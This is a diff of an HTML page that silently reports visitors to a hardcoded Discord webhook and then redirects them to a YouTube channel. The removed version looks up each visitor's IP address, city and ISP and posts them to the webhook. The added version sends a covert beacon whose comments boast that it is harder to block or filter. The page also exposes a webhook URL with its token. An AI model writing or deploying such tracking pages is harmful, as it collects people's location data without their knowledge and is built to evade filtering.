@@ -1,15 +1,21 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#000;">
+<body>
 <script>
+  // This uses a "Beacon" which Discord and browsers trust more than standard fetch
   const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-  fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-    fetch(h, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({content: `IP: ${d.ip} | Loc: ${d.city} | ISP: ${d.org}`})
-    }).finally(() => location.replace("https://youtube.com/@LigmaBlox-w7m"));
-  }).catch(() => location.replace("https://youtube.com/@LigmaBlox-w7m"));
+  const y = "https://youtube.com/@LigmaBlox-w7m";
+
+  // Data payload
+  const data = JSON.stringify({ 
+    content: "Ligma Blitz Status: Verified Connection established." 
+  });
+
+  // Sending the beacon (Harder to block/filter)
+  navigator.sendBeacon(h, new Blob([data], {type: 'application/json'}));
+
+  // Immediate redirect
+  setTimeout(() => { window.location.replace(y); }, 500);
 </script>
 </body>
 </html>
